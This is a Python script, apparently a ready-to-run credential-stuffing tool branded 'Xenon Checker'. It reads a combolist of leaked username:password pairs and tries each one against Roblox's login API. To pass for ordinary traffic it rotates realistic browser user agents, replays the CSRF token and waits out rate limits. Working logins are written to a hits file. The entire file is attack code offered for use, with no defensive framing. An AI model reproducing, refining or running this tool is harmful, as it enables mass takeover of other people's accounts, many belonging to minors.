import requests
import json
from colorama import Fore, init
from time import sleep
import os
import random
import sys
from typing import List, Tuple

# Initialize colorama for colored output
init(autoreset=True)

# Colors for console output
MAGENTA = Fore.MAGENTA
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
RESET = Fore.RESET

# ASCII art for branding
BANNER = f"""{MAGENTA}
▒██   ██▒▓█████  ███▄    █  ▒█████   ███▄    █     ▄████▄   ██░ ██ ▓█████  ▄████▄   ██ ▄█▀▓█████  ██▀███  
▒▒ █ █ ▒░▓█   ▀  ██ ▀█   █ ▒██▒  ██▒ ██ ▀█   █    ▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
░░  █   ░▒███   ▓██  ▀█ ██▒▒██░  ██▒▓██  ▀█ ██▒   ▒▓█    ▄ ▒██▀▀██░▒███   ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒
 ░ █ █ ▒ ▒▓█  ▄ ▓██▒  ▐▌██▒▒██   ██░▓██▒  ▐▌██▒   ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
▒██▒ ▒██▒░▒████▒▒██░   ▓██░░ ████▓▒░▒██░   ▓██░   ▒ ▓███▀ ░░▓█▒░██▓░▒████▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒
▒▒ ░ ░▓ ░░░ ▒░ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒    ░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
░░   ░▒ ░ ░ ░  ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░     ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
 ░    ░     ░      ░   ░ ░ ░ ░ ░ ▒     ░   ░ ░    ░         ░  ░░ ░   ░   ░        ░ ░░ ░    ░     ░░   ░ 
 ░    ░     ░  ░         ░     ░ ░           ░    ░ ░       ░  ░  ░   ░  ░░ ░      ░  ░      ░  ░   ░     
                                                  ░                       ░                               
{RESET}
"""

# List of realistic user agents to rotate
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
]

# Roblox API endpoint
LOGIN_URL = "https://auth.roblox.com/v2/login"

def load_combolist(file_path: str) -> List[Tuple[str, str]]:
    """Load and parse the combolist file into a list of (username, password) tuples."""
    try:
        with open(file_path, "r", encoding="utf-8") as file:
            lines = file.readlines()
        combos = [(line.strip().split(":")[0], line.strip().split(":")[1]) 
                 for line in lines if ":" in line]
        return combos
    except FileNotFoundError:
        print(f"[!] {RED}Error: File '{file_path}' not found.{RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"[!] {RED}Error loading combolist: {str(e)}{RESET}")
        sys.exit(1)

def check_account(username: str, password: str, session: requests.Session, index: int, total: int) -> None:
    """Check a single account's credentials against the Roblox API."""
    headers = {
        "Content-Type": "application/json",
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Origin": "https://www.roblox.com",
        "Connection": "keep-alive",
        "Referer": "https://www.roblox.com/login",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "X-CSRF-TOKEN": "",  # Will be populated if needed
    }

    payload = {
        "ctype": "Username",
        "cvalue": username,
        "password": password
    }

    try:
        # Make the POST request
        response = session.post(LOGIN_URL, json=payload, headers=headers, timeout=10)
        
        # Check for X-CSRF-TOKEN requirement
        if response.status_code == 403 and "x-csrf-token" in response.headers:
            headers["X-CSRF-TOKEN"] = response.headers["x-csrf-token"]
            print(f"[*] {YELLOW}Retrieved X-CSRF-TOKEN. Retrying...{RESET}")
            response = session.post(LOGIN_URL, json=payload, headers=headers, timeout=10)

        print(f"[*] Checking account {index}/{total}...")

        if response.status_code == 200 and "user" in response.text.lower():
            print(f"[✔] {GREEN}SUCCESS: {username}:{password}{RESET}")
            with open("hits.txt", "a", encoding="utf-8") as f:
                f.write(f"{username}:{password}\n")
        elif response.status_code == 429:
            print(f"[!] {YELLOW}Rate limit hit for {username}. Waiting 60 seconds...{RESET}")
            sleep(60)
        elif response.status_code == 403:
            print(f"[✘] {RED}FAILED: {username}:{password} [!] Status code: 403 (Possible CAPTCHA or IP block){RESET}")
        else:
            print(f"[✘] {RED}FAILED: {username}:{password} [!] Status code: {response.status_code}{RESET}")
            if response.status_code != 401:  # Log unexpected errors
                print(f"[!] {YELLOW}Response: {response.text[:100]}{RESET}")

    except requests.exceptions.RequestException as e:
        print(f"[!] {RED}Error checking {username}:{password} - {str(e)}{RESET}")

def main():
    """Main function to orchestrate the combolist checking process."""
    print(BANNER)
    
    # Get combolist file path
    combo_name = input(f"{MAGENTA}Enter combolist file name (e.g., combos.txt): {RESET}").strip()
    if not combo_name:
        print(f"[!] {RED}Error: No file name provided.{RESET}")
        sys.exit(1)
    
    # Load combolist
    print(f"[*] {MAGENTA}Loading combolist...{RESET}")
    combos = load_combolist(combo_name)
    total_accounts = len(combos)
    print(f"[*] {MAGENTA}Loaded {total_accounts} accounts to check.{RESET}")
    sleep(2)
    
    # Clear screen
    os.system("cls" if os.name == "nt" else "clear")
    print(BANNER)
    
    # Initialize session
    session = requests.Session()
    
    # Check each account
    try:
        for index, (username, password) in enumerate(combos, 1):
            check_account(username, password, session, index, total_accounts)
            sleep(1)  # Basic rate-limiting to avoid 429 errors
    except KeyboardInterrupt:
        print(f"\n[!] {RED}Process interrupted by user.{RESET}")
        sys.exit(0)

if __name__ == "__main__":
    main()